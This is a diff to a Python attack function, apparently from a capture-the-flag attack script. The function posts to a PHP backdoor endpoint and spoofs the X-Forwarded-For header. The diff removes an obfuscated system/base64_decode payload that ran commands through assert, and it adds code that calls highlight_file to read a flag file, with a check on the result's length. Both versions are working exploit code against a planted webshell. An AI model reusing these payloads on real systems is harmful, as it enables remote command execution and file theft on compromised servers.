@@ -20,16 +20,19 @@ def vulnerable_attack(target,target_port,cmd):
         # This payload may not work under some php versions
         #payload = "('sy'.'stem')(('bas'.'e64_'.'decode')('%s'))==0"%cmd
         #print payload
-        payload = "call_user_func('sy'.'stem',call_user_func('bas'.'e64_dec'.'ode','%s'));"%cmd
-        data = 'cmd=%s'% (payload) 
+        data = 'cmd=%s'% (flag_path) 
         headers['Cookie'] = data
         headers['X-Forwarded-For'] = '8.8.8.8'
-        res = http("post",target,target_port,"/index.php/admin/login/backdoor?hongkexueyuan=assert",data,headers)
+        res = http("post",target,target_port,"/index.php/admin/login/backdoor?hongkexueyuan=highlight_file",data,headers)
     except Exception,e:
         debug_print(traceback.format_exc())     
         dump_error("attack failed",target,"vulnerable attack")
         res = "error"
-
+    
+    if len(res) ==32:
+        res = cmd_prefix + res + cmd_postfix
+    else:
+        res = 'error'
     return res
 
 
